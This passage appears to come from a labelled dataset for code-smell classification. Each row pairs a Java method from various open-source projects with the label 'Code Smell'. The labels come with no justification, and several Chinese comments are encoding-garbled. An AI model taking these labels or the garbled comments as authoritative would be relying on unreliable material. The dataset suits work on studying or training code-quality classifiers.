    StructVector structVector=(StructVector)mapVector.getDataVector();
    return MapWriter.forArray(mapVector,createArrowFieldWriterForArray(structVector.getChild(MapVector.KEY_NAME),keyType),createArrowFieldWriterForArray(structVector.getChild(MapVector.VALUE_NAME),valueType));
  }
 else   if (vector instanceof ListVector) {
    ListVector listVector=(ListVector)vector;
    LogicalType elementType=((ArrayType)fieldType).getElementType();
    return ArrayWriter.forArray(listVector,createArrowFieldWriterForArray(listVector.getDataVector(),elementType));
  }
 else   if (vector instanceof StructVector) {
    RowType rowType=(RowType)fieldType;
    ArrowFieldWriter<RowData>[] fieldsWriters=new ArrowFieldWriter[rowType.getFieldCount()];
    for (int i=0; i < fieldsWriters.length; i++) {
      fieldsWriters[i]=createArrowFieldWriterForRow(((StructVector)vector).getVectorById(i),rowType.getTypeAt(i));
    }
    return RowWriter.forArray((StructVector)vector,fieldsWriters);
  }
 else   if (vector instanceof NullVector) {
    return new NullWriter<>((NullVector)vector);
  }
 else {
    throw new UnsupportedOperationException(String.format(""Unsupported type %s."",fieldType));
  }
}",1,Code Smell
"@Override public void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setRetainInstance(true);
  accountID=getArguments().getString(""account"");
  AccountSession session=AccountSessionManager.getInstance().getAccount(accountID);
  self=session.self;
  instanceDomain=session.domain;
  customEmojis=AccountSessionManager.getInstance().getCustomEmojis(instanceDomain);
  instance=AccountSessionManager.getInstance().getInstanceInfo(instanceDomain);
  if (getArguments().containsKey(""editStatus"")) {
    editingStatus=Parcels.unwrap(getArguments().getParcelable(""editStatus""));
  }
  if (instance == null) {
    Nav.finish(this);
    return;
  }
  if (customEmojis.isEmpty()) {
    AccountSessionManager.getInstance().updateInstanceInfo(instanceDomain);
  }
  if (instance.maxTootChars > 0)   charLimit=instance.maxTootChars;
 else   if (instance.configuration != null && instance.configuration.statuses != null && instance.configuration.statuses.maxCharacters > 0)   charLimit=instance.configuration.statuses.maxCharacters;
 else   charLimit=500;
  setTitle(editingStatus == null ? R.string.new_post : R.string.edit_post);
  if (savedInstanceState != null)   postLang=Parcels.unwrap(savedInstanceState.getParcelable(""postLang""));
}",1,Code Smell
"/** 
 * Called when a new format is read from the upstream source.
 * @param newFormat The new format.
 * @throws ExoPlaybackException If an error occurs (re-)initializing the decoder.
 */
@CallSuper protected void onInputFormatChanged(Format newFormat) throws ExoPlaybackException {
  Format oldFormat=format;
  format=newFormat;
  pendingFormat=newFormat;
  boolean drmInitDataChanged=!Util.areEqual(format.drmInitData,oldFormat == null ? null : oldFormat.drmInitData);
  if (drmInitDataChanged) {
    if (format.drmInitData != null) {
      if (drmSessionManager == null) {
        throw ExoPlaybackException.createForRenderer(new IllegalStateException(""Media requires a DrmSessionManager""),getIndex());
      }
      DrmSession<ExoMediaCrypto> session=drmSessionManager.acquireSession(Looper.myLooper(),newFormat.drmInitData);
      if (session == decoderDrmSession || session == sourceDrmSession) {
        drmSessionManager.releaseSession(session);
      }
      setSourceDrmSession(session);
    }
 else {
      setSourceDrmSession(null);
    }
  }
  if (sourceDrmSession != decoderDrmSession) {
    if (decoderReceivedBuffers) {
      decoderReinitializationState=REINITIALIZATION_STATE_SIGNAL_END_OF_STREAM;
    }
 else {
      releaseDecoder();
      maybeInitDecoder();
    }
  }
  eventDispatcher.inputFormatChanged(format);
}
",1,Code Smell
"private void initKickOffSeatView(){
  mLayoutKickoffStage=findViewById(R.id.ll_kick_off_stage);
  if (!mViewModel.checkPermission(UserManagementViewModel.ACTION_SEAT_CONTROL) || !mViewModel.isEnableSeatControl() || !mUser.isOnSeat()) {
    mLayoutKickoffStage.setVisibility(View.GONE);
    return;
  }
  mLayoutKickoffStage.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      mViewModel.kickOffStage();
      dismiss();
    }
  }
);
}
",1,Code Smell
"private static boolean isStackAssignment2(Exprent first,Exprent second){
  if (first.type == Exprent.EXPRENT_ASSIGNMENT && second.type == Exprent.EXPRENT_ASSIGNMENT) {
    AssignmentExprent asf=(AssignmentExprent)first;
    AssignmentExprent ass=(AssignmentExprent)second;
    if (asf.getLeft().type == Exprent.EXPRENT_VAR && ass.getRight().type == Exprent.EXPRENT_VAR && asf.getLeft().equals(ass.getRight()) && ((VarExprent)asf.getLeft()).isStack()) {
      if (ass.getLeft().type != Exprent.EXPRENT_VAR || !((VarExprent)ass.getLeft()).isStack()) {
        asf.setRight(new AssignmentExprent(ass.getLeft(),asf.getRight(),ass.bytecode));
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"/** 
 * 鏂囦欢澶у皬鏍￠獙
 * @param file 涓婁紶鐨勬枃浠�
 * @return
 * @throws FileSizeLimitExceededException 濡傛灉瓒呭嚭鏈�澶уぇ灏�
 * @throws InvalidExtensionException
 */
public static final void assertAllowed(MultipartFile file,String[] allowedExtension) throws FileSizeLimitExceededException, InvalidExtensionException {
  long size=file.getSize();
  if (size > DEFAULT_MAX_SIZE) {
    throw new FileSizeLimitExceededException(DEFAULT_MAX_SIZE / 1024 / 1024);
  }
  String fileName=file.getOriginalFilename();
  String extension=getExtension(file);
  if (allowedExtension != null && !isAllowedExtension(extension,allowedExtension)) {
    if (allowedExtension == MimeTypeUtils.IMAGE_EXTENSION) {
      throw new InvalidExtensionException.InvalidImageExtensionException(allowedExtension,extension,fileName);
    }
 else     if (allowedExtension == MimeTypeUtils.FLASH_EXTENSION) {
      throw new InvalidExtensionException.InvalidFlashExtensionException(allowedExtension,extension,fileName);
    }
 else     if (allowedExtension == MimeTypeUtils.MEDIA_EXTENSION) {
      throw new InvalidExtensionException.InvalidMediaExtensionException(allowedExtension,extension,fileName);
    }
 else     if (allowedExtension == MimeTypeUtils.VIDEO_EXTENSION) {
      throw new InvalidExtensionException.InvalidVideoExtensionException(allowedExtension,extension,fileName);
    }
 else {
      throw new InvalidExtensionException(allowedExtension,extension,fileName);
    }
  }
}",1,Code Smell
"@Override public void setBounds(int left,int top,int right,int bottom){
  final int width=right - left;
  final int height=bottom - top;
  if (mltOriginPath != null && mltOriginPath.size() > 0 && (width != mWidth || height != mHeight)) {
    int ox=mStartX, oy=mStartY;
    float ratioWidth=1f * width / mOriginWidth;
    float ratioHeight=1f * height / mOriginHeight;
    mPaths=PathParser.transformScale(ratioWidth,ratioHeight,mltOriginPath,mltOriginSvg);
    if (!onMeasure()) {
      mWidth=width;
      mHeight=height;
      mStartX=(int)(1f * ox * width / mOriginWidth);
      mStartY=(int)(1f * oy * height / mOriginHeight);
      super.setBounds(left,top,right,bottom);
    }
  }
 else {
    super.setBounds(left,top,right,bottom);
  }
}
public void setBounds(@NonNull Rect bounds){
  setBounds(bounds.left,bounds.top,bounds.right,bounds.bottom);
}",1,Code Smell
"@Override public void initialize(ConfigurableApplicationContext applicationContext){
  try {
    onContextInit(applicationContext);
  }
 catch (  Exception e) {
    throw new IllegalStateException(e);
  }
  applicationContext.addApplicationListener(event -> {
    if (event instanceof ContextClosedEvent) {
      onContextClose();
    }
 else     if (event instanceof ContextRefreshedEvent) {
      onContextRefresh(applicationContext);
    }
  }
);
}
",1,Code Smell
"private boolean isSingleArchive(String archivePath){
  archivePath=archivePath.toLowerCase(Locale.ENGLISH);
  for (  String key : extractCommands.keySet()) {
    if (archivePath.endsWith(key) && (key.equals("".xz"") || key.equals("".gz"") || key.equals("".bz2""))) {
      if (!(archivePath.endsWith("".tar.xz"") || archivePath.endsWith("".tar.gz"") || archivePath.endsWith("".tar.bz2""))) {
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"/** 
 * Used to replace reference IDs in XMLs. When resource requests are forwarded to modules, the may include references to resources with the same name as in the original resources, but the IDs generated by aapt will be different. rewriteXmlReferencesNative walks through all references and calls this function to find out the original ID, which it then writes to the compiled XML file in the memory.
 */
private static int translateResId(int id,XResources origRes,Resources repRes){
  try {
    String entryName=repRes.getResourceEntryName(id);
    String entryType=repRes.getResourceTypeName(id);
    String origPackage=origRes.mPackageName;
    int origResId=0;
    try {
      origResId=origRes.getIdentifier(entryName,entryType,origPackage);
    }
 catch (    NotFoundException ignored) {
    }
    boolean repResDefined=false;
    try {
      final TypedValue tmpValue=new TypedValue();
      repRes.getValue(id,tmpValue,false);
      repResDefined=!(tmpValue.type == TypedValue.TYPE_INT_BOOLEAN && tmpValue.data == 0);
    }
 catch (    NotFoundException ignored) {
    }
    if (!repResDefined && origResId == 0 && !entryType.equals(""id"")) {
      XposedBridge.log(entryType + ""/"" + entryName+ "" is neither defined in module nor in original resources"");
      return 0;
    }
    if (origResId == 0)     origResId=getFakeResId(repRes,id);
    if (repResDefined && !entryType.equals(""id""))     origRes.setReplacement(origResId,new XResForwarder(repRes,id));
    return origResId;
  }
 catch (  Exception e) {
    XposedBridge.log(e);
    return id;
  }
}",1,Code Smell
"/** 
 * registry remove
 * @param data
 * @return
 */
@RequestMapping(""/registryRemove"") public ReturnT<String> registryRemove(HttpServletRequest request,@RequestBody(required=false) String data){
  if (JobAdminConfig.getAdminConfig().getAccessToken() != null && JobAdminConfig.getAdminConfig().getAccessToken().trim().length() > 0 && !JobAdminConfig.getAdminConfig().getAccessToken().equals(request.getHeader(JobRemotingUtil.XXL_RPC_ACCESS_TOKEN))) {
    return new ReturnT<>(ReturnT.FAIL_CODE,""The access token is wrong."");
  }
  RegistryParam registryParam=null;
  try {
    registryParam=JacksonUtil.readValue(data,RegistryParam.class);
  }
 catch (  Exception e) {
  }
  if (registryParam == null) {
    return new ReturnT<>(ReturnT.FAIL_CODE,""The request data invalid."");
  }
  return adminBiz.registryRemove(registryParam);
}",1,Code Smell
"public void changeFragment(){
  FragmentTransaction ft=mManager.beginTransaction();
  int position=mTabLayout.getSelectedTabPosition();
  List<Fragment> addedFragments=mManager.getFragments();
  for (int i=0; i < mFragments.size(); i++) {
    Fragment fragment=mFragments.get(i);
    if ((addedFragments == null || !addedFragments.contains(fragment)) && mContainerResId != 0) {
      ft.add(mContainerResId,fragment);
    }
    if ((mFragments.size() > position && i == position) || (mFragments.size() <= position && i == mFragments.size() - 1)) {
      ft.show(fragment);
    }
 else {
      ft.hide(fragment);
    }
  }
  ft.commit();
  mManager.executePendingTransactions();
}",1,Code Smell
"protected String computeSpanName(String dbName,String operation,String mainIdentifier){
  if (operation == null) {
    return dbName == null ? DEFAULT_SPAN_NAME : dbName;
  }
  StringBuilder name=new StringBuilder(operation);
  if (dbName != null || mainIdentifier != null) {
    name.append(' ');
  }
  if (dbName != null && (mainIdentifier == null || mainIdentifier.indexOf('.') == -1)) {
    name.append(dbName);
    if (mainIdentifier != null) {
      name.append('.');
    }
  }
  if (mainIdentifier != null) {
    name.append(mainIdentifier);
  }
  return name.toString();
}",1,Code Smell
"@Subscribe public void viewTransaction(ViewTransactionEvent event){
  if (txdata.getTransaction().getTxId().equals(event.getTransaction().getTxId())) {
    TreeItem<TransactionForm> existingItem=getTreeItem(event.getInitialView(),event.getInitialIndex());
    if (existingItem != null && !(existingItem.getValue() instanceof PageForm)) {
      setTreeSelection(event.getInitialView(),event.getInitialIndex());
    }
 else     if (event.getInitialView().equals(TransactionView.INPUT) || event.getInitialView().equals(TransactionView.OUTPUT)) {
      TreeItem<TransactionForm> parentItem=getTreeItem(event.getInitialView().equals(TransactionView.INPUT) ? TransactionView.INPUTS : TransactionView.OUTPUTS,null);
      TreeItem<TransactionForm> newItem=event.getInitialView().equals(TransactionView.INPUT) ? createInputTreeItem(event.getInitialIndex()) : createOutputTreeItem(event.getInitialIndex());
      int max=event.getInitialView().equals(TransactionView.INPUT) ? getTransaction().getInputs().size() : getTransaction().getOutputs().size();
      PageForm nextPageForm=new PageForm(event.getInitialView(),event.getInitialIndex() + 1,Math.min(max,event.getInitialIndex() + 1 + PageForm.PAGE_SIZE));
      TreeItem<TransactionForm> nextPageItem=new TreeItem<>(nextPageForm);
      if (existingItem != null) {
        parentItem.getChildren().remove(existingItem);
      }
      int highestIndex=((IndexedTransactionForm)parentItem.getChildren().get(parentItem.getChildren().size() - 1).getValue()).getIndex();
      if (event.getInitialIndex() < highestIndex) {
        for (int i=0; i < parentItem.getChildren().size(); i++) {
          TreeItem<TransactionForm> childItem=parentItem.getChildren().get(i);
          IndexedTransactionForm txForm=(IndexedTransactionForm)childItem.getValue();
          if (txForm.getIndex() > event.getInitialIndex()) {
            parentItem.getChildren().add(i,newItem);
            if (txForm.getIndex() != event.getInitialIndex() + 1) {
              parentItem.getChildren().add(i + 1,nextPageItem);
            }
            break;
          }
        }
      }
 else {
        parentItem.getChildren().add(newItem);
        if ((event.getInitialIndex() + 1) != max) {
          parentItem.getChildren().add(nextPageItem);
        }
      }
      if (event.getInitialView().equals(TransactionView.INPUT)) {
        fetchThisAndInputBlockTransactions(event.getInitialIndex(),event.getInitialIndex() + 1);
      }
 else {
        fetchOutputBlockTransactions(event.getInitialIndex(),event.getInitialIndex() + 1);
      }
      setTreeSelection(event.getInitialView(),event.getInitialIndex());
    }
  }
}",1,Code Smell
"private void checkLocalConfig(CacheData cacheData){
  final String dataId=cacheData.dataId;
  final String group=cacheData.group;
  final String tenant=cacheData.tenant;
  File path=LocalConfigInfoProcessor.getFailoverFile(agent.getName(),dataId,group,tenant);
  if (!cacheData.isUseLocalConfigInfo() && path.exists()) {
    String content=LocalConfigInfoProcessor.getFailover(agent.getName(),dataId,group,tenant);
    String md5=MD5.getInstance().getMD5String(content);
    cacheData.setUseLocalConfigInfo(true);
    cacheData.setLocalConfigInfoVersion(path.lastModified());
    cacheData.setContent(content);
    LOGGER.warn(""[{}] [failover-change] failover file created. dataId={}, group={}, tenant={}, md5={}, content={}"",agent.getName(),dataId,group,tenant,md5,ContentUtils.truncateContent(content));
    return;
  }
  if (cacheData.isUseLocalConfigInfo() && !path.exists()) {
    cacheData.setUseLocalConfigInfo(false);
    LOGGER.warn(""[{}] [failover-change] failover file deleted. dataId={}, group={}, tenant={}"",agent.getName(),dataId,group,tenant);
    return;
  }
  if (cacheData.isUseLocalConfigInfo() && path.exists() && cacheData.getLocalConfigInfoVersion() != path.lastModified()) {
    String content=LocalConfigInfoProcessor.getFailover(agent.getName(),dataId,group,tenant);
    String md5=MD5.getInstance().getMD5String(content);
    cacheData.setUseLocalConfigInfo(true);
    cacheData.setLocalConfigInfoVersion(path.lastModified());
    cacheData.setContent(content);
    LOGGER.warn(""[{}] [failover-change] failover file changed. dataId={}, group={}, tenant={}, md5={}, content={}"",agent.getName(),dataId,group,tenant,md5,ContentUtils.truncateContent(content));
  }
}",1,Code Smell
"private void setMiddleText(){
  if (KGCS == null)   return;
  mStatusArea.post(() -> {
    if (KGMiddleCustomText.isEmpty()) {
      mStatusArea.removeView(KGMiddleCustomTextView);
    }
 else {
      try {
        ViewGroup parent=(ViewGroup)KGMiddleCustomTextView.getParent();
        if (parent != null) {
          ((ViewGroup)KGMiddleCustomTextView.getParent()).removeView(KGMiddleCustomTextView);
        }
        mStatusArea.addView(KGMiddleCustomTextView,0);
        KGMiddleCustomTextView.setText(clockStringFormatter.formatString(KGMiddleCustomText));
      }
 catch (      Exception ignored) {
      }
    }
  }
);
}",1,Code Smell
"/** 
 * Draw ripple effect
 */
private void drawFillCircle(Canvas canvas){
  if (canvas != null && pointX >= 0 && pointY >= 0) {
    int rbX=canvas.getWidth();
    int rbY=canvas.getHeight();
    float xMax=Math.max(pointX,Math.abs(rbX - pointX));
    float yMax=Math.max(pointY,Math.abs(rbY - pointY));
    float longDis=(float)Math.sqrt(xMax * xMax + yMax * yMax);
    if (mRippleRadius > longDis) {
      onCompleteDrawRipple();
      return;
    }
    final float drawSpeed=longDis / mRippleDuration * 35;
    mRippleRadius+=drawSpeed;
    canvas.save();
    mPath.reset();
    canvas.clipPath(mPath);
    if (mShapeType == 0) {
      mPath.addCircle(rbX >> 1,rbY >> 1,mWidth >> 1,Path.Direction.CCW);
    }
 else {
      mRectF.set(0,0,mWidth,mHeight);
      mPath.addRoundRect(mRectF,mRoundRadius,mRoundRadius,Path.Direction.CCW);
    }
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      canvas.clipPath(mPath);
    }
 else {
      canvas.clipPath(mPath,Region.Op.REPLACE);
    }
    canvas.drawCircle(pointX,pointY,mRippleRadius,mRipplePaint);
    canvas.restore();
  }
}",1,Code Smell
"@Override public void onDestroy(){
  super.onDestroy();
  String newTitle=titleEdit.getText().toString();
  FollowList.RepliesPolicy newRepliesPolicy=getSelectedRepliesPolicy();
  boolean newExclusive=exclusiveItem.checked;
  if (!newTitle.equals(followList.title) || newRepliesPolicy != followList.repliesPolicy || newExclusive != followList.exclusive) {
    new UpdateList(followList.id,newTitle,newRepliesPolicy,newExclusive).setCallback(new Callback<>(){
      @Override public void onSuccess(      FollowList result){
        AccountSessionManager.get(accountID).getCacheController().updateList(result);
        E.post(new ListUpdatedEvent(accountID,result));
      }
      @Override public void onError(      ErrorResponse error){
      }
    }
).exec(accountID);
  }
}
",1,Code Smell
"/** 
 * 鑾峰彇鑿滃崟鏁版嵁鏉冮檺
 * @param user 鐢ㄦ埛淇℃伅
 * @return 鑿滃崟鏉冮檺淇℃伅
 */
public Set<String> getMenuPermission(SysUserEntity user){
  Set<String> perms=new HashSet<String>();
  if (user.isAdmin()) {
    perms.add(""*:*:*"");
  }
 else {
    List<SysRoleEntity> roles=user.getRoles();
    if (!roles.isEmpty() && roles.size() > 1) {
      for (      SysRoleEntity role : roles) {
        Set<String> rolePerms=menuService.selectMenuPermsByRoleId(role.getRoleId());
        role.setPermissions(rolePerms);
        perms.addAll(rolePerms);
      }
    }
 else {
      perms.addAll(menuService.selectMenuPermsByUserId(user.getUserId()));
    }
  }
  return perms;
}",1,Code Smell
"@Override @CrmPermission(bizTypeValue=""#createReqVO.bizType"",bizId=""#createReqVO.bizId"",level=CrmPermissionLevelEnum.WRITE) public Long createFollowUpRecord(CrmFollowUpRecordSaveReqVO createReqVO){
  CrmFollowUpRecordDO record=BeanUtils.toBean(createReqVO,CrmFollowUpRecordDO.class);
  crmFollowUpRecordMapper.insert(record);
  if (ObjUtil.equal(CrmBizTypeEnum.CRM_CUSTOMER.getType(),record.getBizType())) {
    customerService.updateCustomerFollowUp(record.getBizId(),record.getNextTime(),record.getContent());
  }
  if (ObjUtil.equal(CrmBizTypeEnum.CRM_BUSINESS.getType(),record.getBizType())) {
    businessService.updateBusinessFollowUp(record.getBizId(),record.getNextTime(),record.getContent());
  }
  if (ObjUtil.equal(CrmBizTypeEnum.CRM_CLUE.getType(),record.getBizType())) {
    clueService.updateClueFollowUp(record.getBizId(),record.getNextTime(),record.getContent());
  }
  if (ObjUtil.equal(CrmBizTypeEnum.CRM_CONTACT.getType(),record.getBizType())) {
    contactService.updateContactFollowUp(record.getBizId(),record.getNextTime(),record.getContent());
  }
  if (ObjUtil.equal(CrmBizTypeEnum.CRM_CONTRACT.getType(),record.getBizType())) {
    contractService.updateContractFollowUp(record.getBizId(),record.getNextTime(),record.getContent());
  }
  if (CollUtil.isNotEmpty(createReqVO.getContactIds())) {
    contactService.updateContactContactNextTime(createReqVO.getContactIds(),createReqVO.getNextTime());
  }
  if (CollUtil.isNotEmpty(createReqVO.getBusinessIds())) {
    businessService.updateBusinessContactNextTime(createReqVO.getBusinessIds(),createReqVO.getNextTime());
  }
  return record.getId();
}
",1,Code Smell
"private void updateDrawableRadius(Drawable drawable){
  if (drawable == null) {
    return;
  }
  if (drawable instanceof ClipRoundedDrawable) {
    ((ClipRoundedDrawable)drawable).setRadii(roundRadius[0],roundRadius[1],roundRadius[2],roundRadius[3]);
  }
 else   if ((hasRoundRadius() || gradientShader != null) && (drawable instanceof BitmapDrawable || drawable instanceof AvatarDrawable)) {
    if (drawable instanceof AvatarDrawable) {
      ((AvatarDrawable)drawable).setRoundRadius(roundRadius[0]);
    }
 else {
      BitmapDrawable bitmapDrawable=(BitmapDrawable)drawable;
      if (bitmapDrawable instanceof RLottieDrawable) {
      }
 else       if (bitmapDrawable instanceof AnimatedFileDrawable) {
        AnimatedFileDrawable animatedFileDrawable=(AnimatedFileDrawable)drawable;
        animatedFileDrawable.setRoundRadius(roundRadius);
      }
 else       if (bitmapDrawable.getBitmap() != null && !bitmapDrawable.getBitmap().isRecycled()) {
        setDrawableShader(drawable,new BitmapShader(bitmapDrawable.getBitmap(),Shader.TileMode.CLAMP,Shader.TileMode.CLAMP));
      }
    }
  }
 else {
    setDrawableShader(drawable,null);
  }
}",1,Code Smell
"private TLRPC.TL_messages_stickerSet getCachedStickerSetInternal(long id,Integer hash){
  TLRPC.TL_messages_stickerSet set=null;
  SQLiteCursor cursor=null;
  NativeByteBuffer data=null;
  try {
    cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash FROM stickersets WHERE id = "" + id + "" LIMIT 1"");
    if (cursor.next() && !cursor.isNull(0)) {
      data=cursor.byteBufferValue(0);
      if (data != null) {
        set=TLRPC.TL_messages_stickerSet.TLdeserialize(data,data.readInt32(false),false);
        int cachedHash=cursor.intValue(1);
        if (hash != null && hash != 0 && hash != cachedHash) {
          return null;
        }
      }
    }
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    if (data != null) {
      data.reuse();
    }
    if (cursor != null) {
      cursor.dispose();
    }
  }
  return set;
}",1,Code Smell
"@Override public void setWorkTaskOwnerUser(WorkTaskOwnerUserBO workTaskOwnerUserBO){
  WorkTask auldTask=getById(workTaskOwnerUserBO.getTaskId());
  if (StrUtil.isEmpty(auldTask.getOwnerUserId())) {
    String[] userIds=workTaskOwnerUserBO.getOwnerUserId().split("","");
    for (    String id : userIds) {
      if (StrUtil.isNotBlank(id)) {
        String userName=UserCacheUtil.getUserName(Long.valueOf(id));
        WorkTaskLog workTaskLog=new WorkTaskLog();
        workTaskLog.setUserId(UserUtil.getUserId());
        workTaskLog.setTaskId(workTaskOwnerUserBO.getTaskId());
        workTaskLog.setContent(""娣诲姞"" + userName + ""鍙備笌浠诲姟"");
        workTaskLogService.saveWorkTaskLog(workTaskLog);
      }
    }
  }
 else {
    if (StrUtil.isNotEmpty(workTaskOwnerUserBO.getOwnerUserId())) {
      String[] userIds=workTaskOwnerUserBO.getOwnerUserId().split("","");
      List<Long> ids=new ArrayList<>();
      for (      String id : userIds) {
        if (StrUtil.isNotBlank(id)) {
          if (!auldTask.getOwnerUserId().contains("","" + id + "","")) {
            ids.add(Long.valueOf(id));
            String userName=UserCacheUtil.getUserName(Long.valueOf(id));
            WorkTaskLog workTaskLog=new WorkTaskLog();
            workTaskLog.setUserId(UserUtil.getUserId());
            workTaskLog.setTaskId(workTaskOwnerUserBO.getTaskId());
            workTaskLog.setContent(""娣诲姞"" + userName + ""鍙備笌浠诲姟"");
            workTaskLogService.saveWorkTaskLog(workTaskLog);
          }
        }
      }
      if (ids.size() > 0) {
        AdminMessageBO adminMessageBO=new AdminMessageBO();
        adminMessageBO.setMessageType(AdminMessageEnum.OA_TASK_JOIN.getType());
        adminMessageBO.setTypeId(auldTask.getTaskId());
        adminMessageBO.setUserId(UserUtil.getUserId());
        adminMessageBO.setTitle(auldTask.getName());
        adminMessageBO.setIds(ids);
        ApplicationContextHolder.getBean(AdminMessageService.class).sendMessage(adminMessageBO);
      }
    }
  }
  WorkTask workTask=new WorkTask();
  String ownerUserId=workTaskOwnerUserBO.getOwnerUserId();
  if (StrUtil.isNotEmpty(ownerUserId)) {
    workTask.setOwnerUserId(SeparatorUtil.fromString(ownerUserId));
  }
  updateById(workTask.setTaskId(workTaskOwnerUserBO.getTaskId()));
}",1,Code Smell
"@Override public void neighborChanged(BlockState state,Level worldIn,BlockPos pos,Block p_220069_4_,BlockPos p_220069_5_,boolean p_220069_6_){
  if (worldIn.isClientSide)   return;
  boolean previouslyPowered=state.getValue(POWERED);
  boolean shouldPower=worldIn.hasNeighborSignal(pos);
  if (!previouslyPowered && !shouldPower && shouldBePowered(state,worldIn,pos)) {
    worldIn.setBlock(pos,state.setValue(POWERED,true),3);
    return;
  }
  if (previouslyPowered == shouldPower)   return;
  List<BlockPos> toUpdate=new ArrayList<>();
  Direction facing=state.getValue(FACING);
  Axis axis=facing.getAxis();
  for (  Direction d : Iterate.directionsInAxis(axis)) {
    BlockPos currentPos=pos.relative(d);
    while (true) {
      if (!worldIn.isLoaded(currentPos))       break;
      BlockState currentState=worldIn.getBlockState(currentPos);
      if (!(currentState.getBlock() instanceof GantryShaftBlock))       break;
      if (currentState.getValue(FACING) != facing)       break;
      if (!shouldPower && currentState.getValue(POWERED) && worldIn.hasNeighborSignal(currentPos))       return;
      if (currentState.getValue(POWERED) == shouldPower)       break;
      toUpdate.add(currentPos);
      currentPos=currentPos.relative(d);
    }
  }
  toUpdate.add(pos);
  for (  BlockPos blockPos : toUpdate) {
    BlockState blockState=worldIn.getBlockState(blockPos);
    BlockEntity be=worldIn.getBlockEntity(blockPos);
    if (be instanceof KineticBlockEntity)     ((KineticBlockEntity)be).detachKinetics();
    if (blockState.getBlock() instanceof GantryShaftBlock)     worldIn.setBlock(blockPos,blockState.setValue(POWERED,shouldPower),2);
  }
}",1,Code Smell
"/** 
 * Find the condition that fulfills specified key value pairs from an array of ""condition,constant"", and return the corresponding string constant. A condition is ""pattern1[:pattern2...] (or an empty string for the default). A pattern is ""key=regexp_value"" string. The condition matches only if all patterns of the condition are true for the specified key value pairs. <p> For example, ""condition,constant"" has the following format. - HARDWARE=mako,constantForNexus4 - MODEL=Nexus 4:MANUFACTURER=LGE,constantForNexus4 - ,defaultConstant
 * @param keyValuePairs attributes to be used to look for a matched condition.
 * @param conditionConstantArray an array of ""condition,constant"" elements to be searched.
 * @return the constant part of the matched ""condition,constant"" element. Returns null if nocondition matches.
 */
static String findConstantForKeyValuePairs(final HashMap<String,String> keyValuePairs,final String[] conditionConstantArray){
  if (conditionConstantArray == null || keyValuePairs == null) {
    return null;
  }
  String foundValue=null;
  for (  final String conditionConstant : conditionConstantArray) {
    final int posComma=conditionConstant.indexOf(',');
    if (posComma < 0) {
      Log.w(TAG,""Array element has no comma: "" + conditionConstant);
      continue;
    }
    final String condition=conditionConstant.substring(0,posComma);
    if (condition.isEmpty()) {
      Log.w(TAG,""Array element has no condition: "" + conditionConstant);
      continue;
    }
    try {
      if (fulfillsCondition(keyValuePairs,condition)) {
        if (foundValue == null) {
          foundValue=conditionConstant.substring(posComma + 1);
        }
      }
    }
 catch (    final DeviceOverridePatternSyntaxError e) {
      Log.w(TAG,""Syntax error, ignored"",e);
    }
  }
  return foundValue;
}",1,Code Smell
"public FlatInspector(JRootPane rootPane){
  this.rootPane=rootPane;
  mouseMotionListener=new MouseMotionAdapter(){
    @Override public void mouseMoved(    MouseEvent e){
      lastX=e.getX();
      lastY=e.getY();
      inspect(lastX,lastY);
    }
  }
;
  keyListener=e -> {
    KeyEvent keyEvent=(KeyEvent)e;
    int keyCode=keyEvent.getKeyCode();
    int id=e.getID();
    if (id == KeyEvent.KEY_PRESSED) {
      if (keyCode == KeyEvent.VK_CONTROL || keyCode == KeyEvent.VK_SHIFT || keyCode == KeyEvent.VK_ALT)       wasModifierKeyPressed=true;
    }
 else     if (id == KeyEvent.KEY_RELEASED && wasModifierKeyPressed) {
      if ((keyEvent.getWhen() - lastWhen) <= 5)       return;
      lastWhen=keyEvent.getWhen();
      if (keyCode == KeyEvent.VK_CONTROL) {
        inspectParentLevel++;
        int parentLevel=inspect(lastX,lastY);
        if (inspectParentLevel > parentLevel)         inspectParentLevel=parentLevel;
      }
 else       if (keyCode == KeyEvent.VK_SHIFT && inspectParentLevel > 0) {
        inspectParentLevel--;
        int parentLevel=inspect(lastX,lastY);
        if (inspectParentLevel > parentLevel) {
          inspectParentLevel=Math.max(parentLevel - 1,0);
          inspect(lastX,lastY);
        }
      }
 else       if (keyCode == KeyEvent.VK_ALT && lastComponent != null) {
        showClassHierarchy=!showClassHierarchy;
        showToolTip(lastComponent,lastX,lastY,inspectParentLevel);
      }
    }
    if (keyCode == KeyEvent.VK_ESCAPE) {
      keyEvent.consume();
      if (id == KeyEvent.KEY_PRESSED) {
        setEnabled(false);
        FlatInspector inspector=(FlatInspector)rootPane.getClientProperty(FlatInspector.class);
        if (inspector == FlatInspector.this)         rootPane.putClientProperty(FlatInspector.class,null);
      }
    }
  }
;
  windowListener=new WindowAdapter(){
    @Override public void windowActivated(    WindowEvent e){
      update();
    }
    @Override public void windowDeactivated(    WindowEvent e){
      hidePopup();
    }
  }
;
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  Pattern fullyQualifiedType=Pattern.compile(StringUtils.aspectjNameToPattern(fullyQualifiedTypeName));
  return Preconditions.check(new UsesType<>(fullyQualifiedTypeName,false),new JavaVisitor<ExecutionContext>(){
    @Override public J visitIdentifier(    J.Identifier ident,    ExecutionContext ctx){
      if (ident.getType() != null && getCursor().firstEnclosing(J.Import.class) == null && getCursor().firstEnclosing(J.FieldAccess.class) == null && !(getCursor().getParentOrThrow().getValue() instanceof J.ParameterizedType) && !(getCursor().getParentOrThrow().getValue() instanceof J.ArrayType)) {
        JavaType.FullyQualified type=TypeUtils.asFullyQualified(ident.getType());
        if (typeMatches(Boolean.TRUE.equals(checkAssignability),fullyQualifiedType,type) && ident.getSimpleName().equals(type.getClassName())) {
          return SearchResult.found(ident);
        }
      }
      return super.visitIdentifier(ident,ctx);
    }
    @Override public <N extends NameTree>N visitTypeName(    N name,    ExecutionContext ctx){
      N n=super.visitTypeName(name,ctx);
      JavaType.FullyQualified type=TypeUtils.asFullyQualified(n.getType());
      if (typeMatches(Boolean.TRUE.equals(checkAssignability),fullyQualifiedType,type) && getCursor().firstEnclosing(J.Import.class) == null) {
        return SearchResult.found(n);
      }
      return n;
    }
